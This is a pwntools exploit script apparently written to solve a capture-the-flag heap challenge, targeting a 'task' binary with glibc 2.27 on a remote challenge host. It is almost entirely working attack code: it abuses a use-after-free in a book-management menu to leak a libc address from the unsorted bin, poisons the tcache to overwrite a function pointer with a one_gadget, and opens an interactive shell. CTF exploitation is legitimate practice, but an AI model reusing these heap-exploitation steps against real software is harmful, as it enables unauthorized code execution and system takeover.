#!/usr/bin/env python3

from pwn import *

#exe = ELF("./task_patched")
exe = ELF("./task")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 29394)

    return r


def create_book(r, size):
    r.recvuntil(b">> ")
    r.sendline(b"1")
    r.recvuntil(b"book size:\n")
    r.sendline(str(size).encode())

def delete_book(r, index):
    r.recvuntil(b">> ")
    r.sendline(b"3")
    r.recvuntil(b"Book index:\n")
    r.sendline(str(index).encode())

def read_book(r, index):
    print(r.recvuntil(b">> "))
    r.sendline(b"4")
    print(r.recvuntil(b"Book index:\n"))
    r.sendline(str(index).encode())
    r.recvuntil(b"OUTPUT: ")
    leak = r.recvuntil(b"1-")
    return leak[:6]

def leak(r):
   create_book(r, 8) 
   create_book(r, 10000)#so we get unsorted bin
   create_book(r, 8)#so we get unsorted bin
   delete_book(r, 1)
   return u64(read_book(r, 1) + b"\x00\x00")

def edit_book(r, index, content):
    r.recvuntil(b">> ")
    r.sendline(b"2")
    r.recvuntil(b"Book index:\n")
    r.sendline(str(index).encode())
    r.recvuntil(b"Provide book content:\n")
    r.sendline(content)

def setup_overwrite(r, addr):
   delete_book(r, 0)
   edit_book(r, 0, p64(addr))
   create_book(r, 8) 
   create_book(r, 8) 

def main():
    r = conn()

    leak_offset = 0x3ebca0
    # good luck pwning :)
    l = leak(r)
    libc_base = l - leak_offset
    print(f"Leak from unsorted bin: {hex(l)}")
    print(f"Libc base: {hex(libc_base)}")

    setup_overwrite(r, 0x602110)

    one_gadget_off = 0x4f2a5
    edit_book(r, 4, p64(libc_base + one_gadget_off))
    
    r.sendline(b"17")

    r.interactive()


if __name__ == "__main__":
    main()
